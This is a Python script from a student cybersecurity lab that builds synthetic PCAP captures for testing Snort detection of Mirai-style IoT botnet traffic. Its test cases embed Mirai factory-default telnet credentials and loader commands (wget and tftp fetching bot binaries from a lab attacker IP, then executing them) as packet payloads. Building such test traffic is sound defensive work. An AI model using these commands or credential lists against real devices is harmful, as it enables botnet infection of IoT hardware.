"""
================================================================================
CSL-I09 — B.Tech Cyber Security Laboratory Mini Project
Topic   : Snort Rules for IoT Botnet Attacks
File    : src/traffic_generator.py
Author  : Kushal Kumar   |   Roll No: 23ESKCY026
Institute: Swami Keshvanand Institute of Technology (SKIT), Jaipur
Semester : VI  |  Academic Year: 2025-26
================================================================================

PURPOSE
-------
This script generates synthetic PCAP (Packet Capture) files that simulate
IoT botnet attack scenarios — specifically Mirai-style telnet brute-force,
port scanning, and post-authentication loader payloads — for use with the
Snort IDS rule-testing lab.

It is entirely self-contained: it uses only Python standard-library modules
(struct, socket, os, sys, time, random, ipaddress) and writes raw libpcap-
format binary files without requiring Scapy, root/administrator privileges,
or any live network interface.

NETWORK TOPOLOGY
----------------
  192.168.56.0/24   — Lab subnet (HOME_NET)
  192.168.56.5      — Legitimate Admin Workstation  (MAC: 00:0c:29:aa:bb:01)
  192.168.56.10     — Target IoT IP Camera          (MAC: 00:0c:29:cc:dd:02)
                        Ports: Telnet 23/2323, HTTP 80, SSH 22
  192.168.56.11     — Smart Home MQTT Gateway       (port 1883)
  192.168.56.100    — Simulated Mirai Bot/Attacker  (MAC: 00:0c:29:ee:ff:03)
  192.168.56.105    — Secondary Port Scanner Node   (MAC: 00:0c:29:11:22:04)

PCAP FILES GENERATED  (written to ../captures/)
----------------------------------------------
  TC-01  tc01_normal_baseline.pcap          — Legitimate HTTP baseline
  TC-02  tc02_telnet_syn_scan.pcap          — Mirai-style telnet SYN scan
  TC-03  tc03_telnet_bruteforce_root.pcap   — Telnet brute-force (root/admin)
  TC-04  tc04_mirai_factory_creds.pcap      — Mirai factory-default credentials
  TC-05  tc05_mirai_post_auth_loader.pcap   — Post-auth busybox/wget/tftp cmds
  TC-06  tc06_vertical_port_scan.pcap       — Vertical port scan (ports 1-30)
  TC-07  tc07_negative_test_encrypted_ssh.pcap — Encrypted SSH (negative test)
  FULL   iot_botnet_full_test_suite.pcap    — All packets merged & time-sorted

ETHICAL DISCLAIMER
------------------
These PCAP files are SYNTHETIC and contain NO real traffic.  All IP addresses
belong to RFC-5737 / RFC-1918 private ranges used exclusively in an isolated
virtual-lab environment.  This material is produced solely for academic IDS
testing at SKIT Jaipur.  Attempting to replay these captures against any
real or production system is STRICTLY PROHIBITED and may violate applicable
laws (IT Act 2000, Computer Fraud & Abuse Act, etc.).  The author and
institution accept no liability for misuse.

USAGE
-----
  python traffic_generator.py

  PCAPs are written to:
    c:\\Users\\kusha\\OneDrive\\Desktop\\cyber\\Snort_Rules_IoT_Botnet_Attacks\\captures\\

DEPENDENCIES
------------
  Python 3.7+  (stdlib only — no pip installs required)
================================================================================
"""

import os
import sys
import struct
import socket
import random
import time
import ipaddress

# ---------------------------------------------------------------------------
# Directory constants
# ---------------------------------------------------------------------------

_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURES_DIR = os.path.normpath(os.path.join(_SCRIPT_DIR, "..", "captures"))

# ---------------------------------------------------------------------------
# MAC addresses (as bytes)
# ---------------------------------------------------------------------------

MAC_ADMIN    = bytes.fromhex("000c29aabb01")   # 00:0c:29:aa:bb:01  Admin WS
MAC_IOT_CAM  = bytes.fromhex("000c29ccdd02")   # 00:0c:29:cc:dd:02  IoT Camera
MAC_ATTACKER = bytes.fromhex("000c29eeff03")   # 00:0c:29:ee:ff:03  Mirai bot
MAC_SCANNER  = bytes.fromhex("000c29112204")   # 00:0c:29:11:22:04  Port scanner

# ---------------------------------------------------------------------------
# IP addresses
# ---------------------------------------------------------------------------

IP_ADMIN    = "192.168.56.5"
IP_IOT_CAM  = "192.168.56.10"
IP_MQTT_GW  = "192.168.56.11"
IP_ATTACKER = "192.168.56.100"
IP_SCANNER  = "192.168.56.105"

# ---------------------------------------------------------------------------
# libpcap constants
# ---------------------------------------------------------------------------

PCAP_MAGIC         = 0xa1b2c3d4
PCAP_VERSION_MAJOR = 2
PCAP_VERSION_MINOR = 4
PCAP_THISZONE      = 0
PCAP_SIGFIGS       = 0
PCAP_SNAPLEN       = 65535
PCAP_NETWORK       = 1          # DLT_EN10MB (Ethernet)

# TCP flag bit-masks
TCP_FIN  = 0x01
TCP_SYN  = 0x02
TCP_RST  = 0x04
TCP_PSH  = 0x08
TCP_ACK  = 0x10
TCP_URG  = 0x20
TCP_SYN_ACK = TCP_SYN | TCP_ACK   # 0x12
TCP_PSH_ACK = TCP_PSH | TCP_ACK   # 0x18
TCP_FIN_ACK = TCP_FIN | TCP_ACK   # 0x11

# ---------------------------------------------------------------------------
# RFC 1071 checksum
# ---------------------------------------------------------------------------

def rfc1071_checksum(data: bytes) -> int:
    """Compute the Internet checksum (RFC 1071) over *data*.

    Pads to even length, sums 16-bit words, folds carries, returns one's
    complement as an unsigned 16-bit integer.
    """
    if len(data) % 2:
        data += b'\x00'
    total = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i + 1]
        total += word
    # Fold 32-bit sum to 16 bits
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


# ---------------------------------------------------------------------------
# Frame builders
# ---------------------------------------------------------------------------

def build_ethernet(src_mac: bytes, dst_mac: bytes, ethertype: int = 0x0800) -> bytes:
    """Return a 14-byte Ethernet II header.

    Args:
        src_mac   : 6-byte source MAC address.
        dst_mac   : 6-byte destination MAC address.
        ethertype : EtherType field (default 0x0800 = IPv4).
    """
    if len(src_mac) != 6 or len(dst_mac) != 6:
        raise ValueError("MAC addresses must be exactly 6 bytes")
    return dst_mac + src_mac + struct.pack("!H", ethertype)


def build_ipv4(
    src_ip: str,
    dst_ip: str,
    proto: int,
    payload: bytes,
    ttl: int = 64,
    identification: int = None,
) -> bytes:
    """Return a minimal IPv4 header (20 bytes) + *payload*, with checksum.

    Args:
        src_ip        : Dotted-decimal source IP string.
        dst_ip        : Dotted-decimal destination IP string.
        proto         : IP protocol number (e.g. 6 for TCP, 17 for UDP).
        payload       : Upper-layer payload bytes.
        ttl           : Time-to-live (default 64).
        identification: 16-bit IP ID; random if None.
    """
    if identification is None:
        identification = random.randint(0, 0xFFFF)

    src_bytes = socket.inet_aton(src_ip)
    dst_bytes = socket.inet_aton(dst_ip)
    total_len = 20 + len(payload)

    # Build header with checksum = 0 first
    header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45,            # Version=4, IHL=5 (20 bytes, no options)
        0x00,            # DSCP/ECN
        total_len,
        identification,
        0x4000,          # Flags=DF, Fragment offset=0
        ttl,
        proto,
        0x0000,          # Checksum placeholder
        src_bytes,
        dst_bytes,
    )
    checksum = rfc1071_checksum(header)
    # Repack with real checksum
    header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0x00, total_len, identification,
        0x4000, ttl, proto, checksum,
        src_bytes, dst_bytes,
    )
    return header + payload


def build_tcp(
    src_port: int,
    dst_port: int,
    seq: int,
    ack_seq: int,
    flags: int,
    payload: bytes = b"",
    window: int = 8192,
    src_ip: str = "",
    dst_ip: str = "",
) -> bytes:
    """Return a TCP segment (header + payload) with correct checksum.

    The checksum is computed over the IPv4 pseudo-header, so *src_ip* and
    *dst_ip* must be supplied for a valid capture.

    Args:
        src_port : Source TCP port.
        dst_port : Destination TCP port.
        seq      : Sequence number.
        ack_seq  : Acknowledgement number.
        flags    : TCP control flags byte (e.g. TCP_SYN, TCP_PSH_ACK).
        payload  : Application-layer data bytes.
        window   : Receive window size (default 8192).
        src_ip   : Source IP (string) for pseudo-header checksum.
        dst_ip   : Destination IP (string) for pseudo-header checksum.
    """
    data_offset = 5   # 5 × 4 = 20 bytes, no options
    offset_flags = (data_offset << 12) | flags
    tcp_len = 20 + len(payload)

    # Build segment with checksum = 0
    segment = struct.pack(
        "!HHIIHHH",
        src_port,
        dst_port,
        seq,
        ack_seq,
        offset_flags,
        window,
        0,          # checksum placeholder
    ) + b'\x00\x00' + payload  # urgent pointer = 0

    if src_ip and dst_ip:
        pseudo = (
            socket.inet_aton(src_ip)
            + socket.inet_aton(dst_ip)
            + struct.pack("!BBH", 0, 6, tcp_len)
        )
        checksum = rfc1071_checksum(pseudo + segment)
        segment = struct.pack(
            "!HHIIHHH",
            src_port, dst_port, seq, ack_seq,
            offset_flags, window, checksum,
        ) + b'\x00\x00' + payload

    return segment


# ---------------------------------------------------------------------------
# PcapWriter  —  writes standard libpcap (little-endian) format
# ---------------------------------------------------------------------------

class PcapWriter:
    """Context-manager that writes packets to a libpcap file.

    Usage::

        with PcapWriter("output.pcap") as pw:
            pw.write_packet(raw_bytes, ts_sec=1234567890, ts_usec=0)

    The file is closed (and flushed) on exit.
    """

    _GLOBAL_HEADER_FMT = "<IHHiIII"   # little-endian

    def __init__(self, path: str):
        self.path = path
        self._fh = None

    def __enter__(self):
        os.makedirs(os.path.dirname(self.path), exist_ok=True)
        self._fh = open(self.path, "wb")
        self._write_global_header()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self._fh:
            self._fh.flush()
            self._fh.close()
        return False   # do not suppress exceptions

    def _write_global_header(self):
        hdr = struct.pack(
            self._GLOBAL_HEADER_FMT,
            PCAP_MAGIC,
            PCAP_VERSION_MAJOR,
            PCAP_VERSION_MINOR,
            PCAP_THISZONE,
            PCAP_SIGFIGS,
            PCAP_SNAPLEN,
            PCAP_NETWORK,
        )
        self._fh.write(hdr)

    def write_packet(self, data: bytes, ts_sec: int = None, ts_usec: int = 0):
        """Write one packet record.

        Args:
            data    : Raw frame bytes (Ethernet frame).
            ts_sec  : UNIX timestamp seconds (default: current time).
            ts_usec : UNIX timestamp microseconds (default 0).
        """
        if ts_sec is None:
            ts_sec = int(time.time())
        incl_len = min(len(data), PCAP_SNAPLEN)
        orig_len = len(data)
        rec_hdr = struct.pack("<IIII", ts_sec, ts_usec, incl_len, orig_len)
        self._fh.write(rec_hdr)
        self._fh.write(data[:incl_len])

    def write_packets(self, packets):
        """Write an iterable of (data, ts_sec, ts_usec) tuples."""
        for pkt in packets:
            self.write_packet(*pkt)


# ---------------------------------------------------------------------------
# Packet-assembly helpers
# ---------------------------------------------------------------------------

def _make_frame(
    src_mac: bytes, dst_mac: bytes,
    src_ip: str, dst_ip: str,
    src_port: int, dst_port: int,
    seq: int, ack_seq: int, flags: int,
    payload: bytes = b"",
    ttl: int = 64,
    ip_id: int = None,
) -> bytes:
    """Build a full Ethernet+IPv4+TCP frame."""
    tcp_seg = build_tcp(
        src_port, dst_port, seq, ack_seq, flags, payload,
        src_ip=src_ip, dst_ip=dst_ip,
    )
    ip_pkt  = build_ipv4(src_ip, dst_ip, 6, tcp_seg, ttl=ttl, identification=ip_id)
    eth_frm = build_ethernet(src_mac, dst_mac)
    return eth_frm + ip_pkt


def _ts(base: float, offset: float):
    """Return (ts_sec, ts_usec) for a given base + fractional-second offset."""
    t = base + offset
    sec  = int(t)
    usec = int((t - sec) * 1_000_000)
    return sec, usec


# ---------------------------------------------------------------------------
# TC-01  —  Normal HTTP baseline
# ---------------------------------------------------------------------------

def generate_tc01(base_ts: float) -> list:
    """TC-01: 10 packets — legitimate HTTP GET from Admin to IoT Camera port 80.

    Simulates a normal 3-way handshake, HTTP GET, server ACK, then FIN/ACK
    teardown.  Should produce zero Snort alerts.
    """
    print("  [TC-01] Building normal HTTP baseline packets …")
    pkts = []
    src_mac, dst_mac = MAC_ADMIN, MAC_IOT_CAM
    src_ip,  dst_ip  = IP_ADMIN, IP_IOT_CAM
    sport, dport     = 54321, 80
    base_seq = random.randint(100000, 999999)
    srv_seq  = random.randint(100000, 999999)

    # Packet 1 — SYN
    pkts.append((_make_frame(src_mac, dst_mac, src_ip, dst_ip,
                             sport, dport, base_seq, 0, TCP_SYN),
                 *_ts(base_ts, 0.000)))

    # Packet 2 — SYN-ACK  (server → client)
    pkts.append((_make_frame(dst_mac, src_mac, dst_ip, src_ip,
                             dport, sport, srv_seq, base_seq + 1, TCP_SYN_ACK),
                 *_ts(base_ts, 0.050)))

    # Packet 3 — ACK  (client)
    pkts.append((_make_frame(src_mac, dst_mac, src_ip, dst_ip,
                             sport, dport, base_seq + 1, srv_seq + 1, TCP_ACK),
                 *_ts(base_ts, 0.100)))

    # Packet 4 — HTTP GET  (PSH+ACK)
    http_get = b"GET / HTTP/1.1\r\nHost: 192.168.56.10\r\nConnection: close\r\n\r\n"
    pkts.append((_make_frame(src_mac, dst_mac, src_ip, dst_ip,
                             sport, dport, base_seq + 1, srv_seq + 1, TCP_PSH_ACK,
                             payload=http_get),
                 *_ts(base_ts, 0.200)))

    # Packet 5 — Server ACK of GET
    pkts.append((_make_frame(dst_mac, src_mac, dst_ip, src_ip,
                             dport, sport, srv_seq + 1, base_seq + 1 + len(http_get),
                             TCP_ACK),
                 *_ts(base_ts, 0.250)))

    # Packets 6-7 — HTTP 200 OK response (server)
    http_resp_hdr = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 48\r\n\r\n"
    http_resp_body = b"<html><body><h1>IoT Camera OK</h1></body></html>"
    pkts.append((_make_frame(dst_mac, src_mac, dst_ip, src_ip,
                             dport, sport, srv_seq + 1,
                             base_seq + 1 + len(http_get), TCP_PSH_ACK,
                             payload=http_resp_hdr),
                 *_ts(base_ts, 0.400)))
    pkts.append((_make_frame(dst_mac, src_mac, dst_ip, src_ip,
                             dport, sport, srv_seq + 1 + len(http_resp_hdr),
                             base_seq + 1 + len(http_get), TCP_PSH_ACK,
                             payload=http_resp_body),
                 *_ts(base_ts, 0.450)))

    # Packet 8 — Client ACK of response
    pkts.append((_make_frame(src_mac, dst_mac, src_ip, dst_ip,
                             sport, dport, base_seq + 1 + len(http_get),
                             srv_seq + 1 + len(http_resp_hdr) + len(http_resp_body),
                             TCP_ACK),
                 *_ts(base_ts, 0.500)))

    # Packet 9 — FIN+ACK (client initiates close)
    pkts.append((_make_frame(src_mac, dst_mac, src_ip, dst_ip,
                             sport, dport, base_seq + 1 + len(http_get),
                             srv_seq + 1 + len(http_resp_hdr) + len(http_resp_body),
                             TCP_FIN_ACK),
                 *_ts(base_ts, 1.000)))

    # Packet 10 — FIN+ACK (server)
    pkts.append((_make_frame(dst_mac, src_mac, dst_ip, src_ip,
                             dport, sport,
                             srv_seq + 1 + len(http_resp_hdr) + len(http_resp_body),
                             base_seq + 2 + len(http_get),
                             TCP_FIN_ACK),
                 *_ts(base_ts, 2.000)))

    print(f"  [TC-01] Generated {len(pkts)} packets.")
    return pkts


# ---------------------------------------------------------------------------
# TC-02  —  Telnet SYN scan
# ---------------------------------------------------------------------------

def generate_tc02(base_ts: float) -> list:
    """TC-02: 25 SYN packets — Mirai-style telnet port scan on 23 and 2323.

    All packets have only the SYN flag set, different source ephemeral ports
    (40000-40024), targeting ports 23 and 2323 alternately.
    Spread over 1 second to simulate rapid scanning.
    Should trigger SID 1000001 and/or SID 1000002.
    """
    print("  [TC-02] Building Telnet SYN scan packets …")
    pkts = []
    for i in range(25):
        sport  = 40000 + i
        dport  = 23 if i % 2 == 0 else 2323
        seq    = random.randint(1000, 0x7FFFFFFF)
        offset = i * (1.0 / 25)
        frame  = _make_frame(
            MAC_ATTACKER, MAC_IOT_CAM,
            IP_ATTACKER, IP_IOT_CAM,
            sport, dport, seq, 0, TCP_SYN,
        )
        pkts.append((frame, *_ts(base_ts, offset)))

    print(f"  [TC-02] Generated {len(pkts)} packets.")
    return pkts


# ---------------------------------------------------------------------------
# TC-03  —  Telnet brute-force (root / admin credentials)
# ---------------------------------------------------------------------------

def generate_tc03(base_ts: float) -> list:
    """TC-03: 15 PSH+ACK packets — Telnet brute-force username/password attempts.

    Payloads include Mirai-style credential strings such as 'root', 'root:xc3511',
    'root:vizxv', 'admin/admin'.  Should trigger SID 1000003 and 1000010.
    """
    print("  [TC-03] Building Telnet brute-force packets …")
    creds = [
        b"root\r\n",
        b"root\r\n",
        b"xc3511\r\n",
        b"root\r\n",
        b"vizxv\r\n",
        b"admin\r\n",
        b"admin\r\n",
        b"root\r\n",
        b"password\r\n",
        b"root\r\n",
        b"1234\r\n",
        b"admin\r\nadmin\r\n",
        b"root\r\n",
        b"guest\r\n",
        b"root\r\n",
    ]
    pkts = []
    base_seq = random.randint(500000, 999999)
    sport    = 54100
    for i, cred in enumerate(creds):
        offset = i * (5.0 / len(creds))
        frame  = _make_frame(
            MAC_ATTACKER, MAC_IOT_CAM,
            IP_ATTACKER, IP_IOT_CAM,
            sport, 23,
            base_seq + i * 100, i * 100, TCP_PSH_ACK,
            payload=cred,
        )
        pkts.append((frame, *_ts(base_ts, offset)))

    print(f"  [TC-03] Generated {len(pkts)} packets.")
    return pkts


# ---------------------------------------------------------------------------
# TC-04  —  Mirai factory-default credentials
# ---------------------------------------------------------------------------

def generate_tc04(base_ts: float) -> list:
    """TC-04: 20 packets — Mirai factory-credential flow on Telnet port 23.

    Mix of SYN handshake + PSH+ACK credential exchanges carrying known Mirai
    factory defaults: root/xc3511, root/vizxv.
    Should trigger SIDs 1000003, 1000004, 1000005.
    """
    print("  [TC-04] Building Mirai factory-credential packets …")
    pkts = []
    sport    = 55000
    base_seq = random.randint(200000, 800000)
    srv_seq  = random.randint(200000, 800000)

    cred_sequence = [
        # (payload, flags)
        (b"",          TCP_SYN),
        (b"",          TCP_SYN_ACK),
        (b"",          TCP_ACK),
        (b"root\r\n",  TCP_PSH_ACK),
        (b"xc3511\r\n",TCP_PSH_ACK),
        (b"",          TCP_ACK),          # server ack
        (b"root\r\n",  TCP_PSH_ACK),
        (b"vizxv\r\n", TCP_PSH_ACK),
        (b"",          TCP_ACK),
        (b"root\r\n",  TCP_PSH_ACK),
        (b"xc3511\r\n",TCP_PSH_ACK),
        (b"",          TCP_ACK),
        (b"admin\r\n", TCP_PSH_ACK),
        (b"admin\r\n", TCP_PSH_ACK),
        (b"",          TCP_ACK),
        (b"root\r\n",  TCP_PSH_ACK),
        (b"vizxv\r\n", TCP_PSH_ACK),
        (b"",          TCP_ACK),
        (b"",          TCP_FIN_ACK),
        (b"",          TCP_FIN_ACK),
    ]

    for i, (payload, flags) in enumerate(cred_sequence):
        offset = i * (3.0 / len(cred_sequence))
        frame  = _make_frame(
            MAC_ATTACKER, MAC_IOT_CAM,
            IP_ATTACKER, IP_IOT_CAM,
            sport, 23,
            base_seq + i * 50, srv_seq + i * 50, flags,
            payload=payload,
        )
        pkts.append((frame, *_ts(base_ts, offset)))

    print(f"  [TC-04] Generated {len(pkts)} packets.")
    return pkts


# ---------------------------------------------------------------------------
# TC-05  —  Mirai post-auth loader commands
# ---------------------------------------------------------------------------

def generate_tc05(base_ts: float) -> list:
    """TC-05: 10 PSH+ACK packets — Post-authentication busybox/wget/tftp commands.

    Payloads include '/bin/busybox MIRAI', wget and tftp download commands
    that Mirai uses to stage its bot binary on the compromised device.
    Should trigger SIDs 1000006 and 1000007.
    """
    print("  [TC-05] Building Mirai post-auth loader packets …")
    commands = [
        b"/bin/busybox MIRAI\n",
        b"/bin/busybox MIRAI\n",
        b"wget http://192.168.56.100/bot.sh\n",
        b"wget http://192.168.56.100/bot.arm\n",
        b"chmod +x bot.sh\n",
        b"./bot.sh\n",
        b"tftp -g -r bot.arm 192.168.56.100\n",
        b"tftp -g -r bot.mips 192.168.56.100\n",
        b"/bin/busybox MIRAI\n",
        b"wget http://192.168.56.100/kill.sh\n",
    ]
    pkts = []
    sport    = 55500
    base_seq = random.randint(300000, 900000)
    for i, cmd in enumerate(commands):
        offset = i * (2.0 / len(commands))
        frame  = _make_frame(
            MAC_ATTACKER, MAC_IOT_CAM,
            IP_ATTACKER, IP_IOT_CAM,
            sport, 23,
            base_seq + i * 100, i * 100, TCP_PSH_ACK,
            payload=cmd,
        )
        pkts.append((frame, *_ts(base_ts, offset)))

    print(f"  [TC-05] Generated {len(pkts)} packets.")
    return pkts


# ---------------------------------------------------------------------------
# TC-06  —  Vertical port scan (ports 1-30)
# ---------------------------------------------------------------------------

def generate_tc06(base_ts: float) -> list:
    """TC-06: 30 SYN packets — Rapid vertical port scan from scanner node.

    Scans destination ports 1 through 30 on the IoT Camera with SYN packets
    from a fixed source port at high speed (< 2 seconds total).
    Should trigger SID 1000008.
    """
    print("  [TC-06] Building vertical port scan packets …")
    pkts = []
    for i in range(30):
        dport  = i + 1
        sport  = 60000
        seq    = random.randint(1000, 0x7FFFFFFF)
        offset = i * (2.0 / 30)
        frame  = _make_frame(
            MAC_SCANNER, MAC_IOT_CAM,
            IP_SCANNER, IP_IOT_CAM,
            sport, dport, seq, 0, TCP_SYN,
        )
        pkts.append((frame, *_ts(base_ts, offset)))

    print(f"  [TC-06] Generated {len(pkts)} packets.")
    return pkts


# ---------------------------------------------------------------------------
# TC-07  —  Negative test: encrypted SSH (should NOT trigger telnet rules)
# ---------------------------------------------------------------------------

def generate_tc07(base_ts: float) -> list:
    """TC-07: 10 packets — Legitimate SSH connection with random encrypted payload.

    Uses source IP 192.168.56.5 (Admin WS) to IoT Camera port 22.  Payloads
    are random bytes to simulate the opaque ciphertext of an SSH session.
    This is a NEGATIVE test: no Snort rules for telnet should fire.
    """
    print("  [TC-07] Building negative-test encrypted SSH packets …")
    pkts = []
    sport    = 56789
    dport    = 22
    base_seq = random.randint(400000, 950000)
    srv_seq  = random.randint(400000, 950000)

    # Handshake
    handshake = [
        (TCP_SYN,     b""),
        (TCP_SYN_ACK, b""),          # server
        (TCP_ACK,     b""),
    ]
    encrypted_payloads = [
        bytes([random.randint(0, 255) for _ in range(random.randint(40, 120))])
        for _ in range(7)
    ]

    all_steps = handshake + [(TCP_PSH_ACK, p) for p in encrypted_payloads]
    for i, (flags, payload) in enumerate(all_steps):
        offset  = i * (3.0 / len(all_steps))
        is_srv  = (flags == TCP_SYN_ACK)
        s_mac   = MAC_IOT_CAM if is_srv else MAC_ADMIN
        d_mac   = MAC_ADMIN   if is_srv else MAC_IOT_CAM
        s_ip    = IP_IOT_CAM  if is_srv else IP_ADMIN
        d_ip    = IP_ADMIN    if is_srv else IP_IOT_CAM
        s_port  = dport       if is_srv else sport
        d_port  = sport       if is_srv else dport
        s_seq   = srv_seq     if is_srv else base_seq
        s_ack   = base_seq    if is_srv else srv_seq
        frame   = _make_frame(
            s_mac, d_mac, s_ip, d_ip,
            s_port, d_port, s_seq + i * 50, s_ack + i * 50, flags,
            payload=payload,
        )
        pkts.append((frame, *_ts(base_ts, offset)))

    print(f"  [TC-07] Generated {len(pkts)} packets.")
    return pkts


# ---------------------------------------------------------------------------
# PCAP writer helpers
# ---------------------------------------------------------------------------

def _write_pcap(filename: str, packets: list, label: str) -> int:
    """Write a list of (data, ts_sec, ts_usec) tuples to *filename*.

    Returns the number of packets written.
    """
    path = os.path.join(CAPTURES_DIR, filename)
    try:
        with PcapWriter(path) as pw:
            pw.write_packets(packets)
        size_kb = os.path.getsize(path) / 1024
        print(f"  [WRITE] {label} → {filename}  ({len(packets)} pkts, {size_kb:.1f} KB)")
        return len(packets)
    except OSError as exc:
        print(f"  [ERROR] Failed to write {filename}: {exc}", file=sys.stderr)
        raise


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def main():
    """Generate all PCAP files for the IoT Botnet Snort rule test suite."""
    print("=" * 70)
    print("  CSL-I09  Snort Rules for IoT Botnet Attacks — Traffic Generator")
    print(f"  Student : Kushal Kumar  |  Roll: 23ESKCY026  |  SKIT Jaipur")
    print("=" * 70)
    print(f"\n  Output directory: {CAPTURES_DIR}\n")

    # Ensure output directory exists
    try:
        os.makedirs(CAPTURES_DIR, exist_ok=True)
    except OSError as exc:
        print(f"[FATAL] Cannot create captures directory: {exc}", file=sys.stderr)
        sys.exit(1)

    # Base timestamp — use a fixed reproducible time for the lab (2025-01-01 09:00 IST)
    # 2025-01-01 03:30:00 UTC  =  1735702200
    BASE_TS = 1735702200.0

    # Time offsets per test case (seconds apart) so combined PCAP is ordered
    tc_offsets = {
        "tc01": BASE_TS +    0.0,
        "tc02": BASE_TS +   10.0,
        "tc03": BASE_TS +   20.0,
        "tc04": BASE_TS +   30.0,
        "tc05": BASE_TS +   40.0,
        "tc06": BASE_TS +   50.0,
        "tc07": BASE_TS +   60.0,
    }

    summary = []

    # ---- TC-01 ----
    print("\n[TC-01] Normal HTTP Baseline")
    pkts01 = generate_tc01(tc_offsets["tc01"])
    n = _write_pcap("tc01_normal_baseline.pcap", pkts01, "TC-01")
    summary.append(("TC-01", "tc01_normal_baseline.pcap",         n, "Normal HTTP GET — no alerts expected"))

    # ---- TC-02 ----
    print("\n[TC-02] Telnet SYN Scan")
    pkts02 = generate_tc02(tc_offsets["tc02"])
    n = _write_pcap("tc02_telnet_syn_scan.pcap", pkts02, "TC-02")
    summary.append(("TC-02", "tc02_telnet_syn_scan.pcap",         n, "SYN scan on 23/2323 → SID 1000001/1000002"))

    # ---- TC-03 ----
    print("\n[TC-03] Telnet Brute-Force (root/admin)")
    pkts03 = generate_tc03(tc_offsets["tc03"])
    n = _write_pcap("tc03_telnet_bruteforce_root.pcap", pkts03, "TC-03")
    summary.append(("TC-03", "tc03_telnet_bruteforce_root.pcap",  n, "Brute-force 'root' → SID 1000003/1000010"))

    # ---- TC-04 ----
    print("\n[TC-04] Mirai Factory Credentials")
    pkts04 = generate_tc04(tc_offsets["tc04"])
    n = _write_pcap("tc04_mirai_factory_creds.pcap", pkts04, "TC-04")
    summary.append(("TC-04", "tc04_mirai_factory_creds.pcap",     n, "xc3511/vizxv → SID 1000004/1000005"))

    # ---- TC-05 ----
    print("\n[TC-05] Mirai Post-Auth Loader Commands")
    pkts05 = generate_tc05(tc_offsets["tc05"])
    n = _write_pcap("tc05_mirai_post_auth_loader.pcap", pkts05, "TC-05")
    summary.append(("TC-05", "tc05_mirai_post_auth_loader.pcap",  n, "busybox/wget/tftp → SID 1000006/1000007"))

    # ---- TC-06 ----
    print("\n[TC-06] Vertical Port Scan (ports 1-30)")
    pkts06 = generate_tc06(tc_offsets["tc06"])
    n = _write_pcap("tc06_vertical_port_scan.pcap", pkts06, "TC-06")
    summary.append(("TC-06", "tc06_vertical_port_scan.pcap",      n, "30 SYN → SID 1000008"))

    # ---- TC-07 ----
    print("\n[TC-07] Negative Test — Encrypted SSH")
    pkts07 = generate_tc07(tc_offsets["tc07"])
    n = _write_pcap("tc07_negative_test_encrypted_ssh.pcap", pkts07, "TC-07")
    summary.append(("TC-07", "tc07_negative_test_encrypted_ssh.pcap", n, "SSH random bytes — no Telnet alert"))

    # ---- COMBINED ----
    print("\n[FULL ] Merging all packets into full test suite …")
    all_pkts = pkts01 + pkts02 + pkts03 + pkts04 + pkts05 + pkts06 + pkts07
    # Sort by (ts_sec, ts_usec) so Wireshark shows proper chronological order
    all_pkts.sort(key=lambda p: (p[1], p[2]))
    n = _write_pcap("iot_botnet_full_test_suite.pcap", all_pkts, "FULL")
    summary.append(("FULL",  "iot_botnet_full_test_suite.pcap",   n, "All 7 TCs merged & time-sorted"))

    # ---- Summary table ----
    print("\n" + "=" * 70)
    print("  GENERATION SUMMARY")
    print("=" * 70)
    col_w = [6, 42, 6, 40]
    hdr = (
        f"{'ID':<{col_w[0]}} {'File':<{col_w[1]}} {'Pkts':>{col_w[2]}}  {'Notes':<{col_w[3]}}"
    )
    print(hdr)
    print("-" * 70)
    total_pkts = 0
    for tc_id, fname, pkt_cnt, notes in summary:
        print(f"{tc_id:<{col_w[0]}} {fname:<{col_w[1]}} {pkt_cnt:>{col_w[2]}}  {notes:<{col_w[3]}}")
        if tc_id != "FULL":
            total_pkts += pkt_cnt
    print("-" * 70)
    print(f"  Total individual packets : {total_pkts}")
    print(f"  Combined PCAP packets    : {len(all_pkts)}")
    print(f"  Output directory         : {CAPTURES_DIR}")
    print("=" * 70)
    print("\n  All PCAPs generated successfully.")
    print("  Open with: wireshark iot_botnet_full_test_suite.pcap")
    print("  Run Snort: snort -c ../config/snort.conf -r iot_botnet_full_test_suite.pcap -A fast\n")


if __name__ == "__main__":
    random.seed(42)   # Fixed seed for reproducible captures
    main()
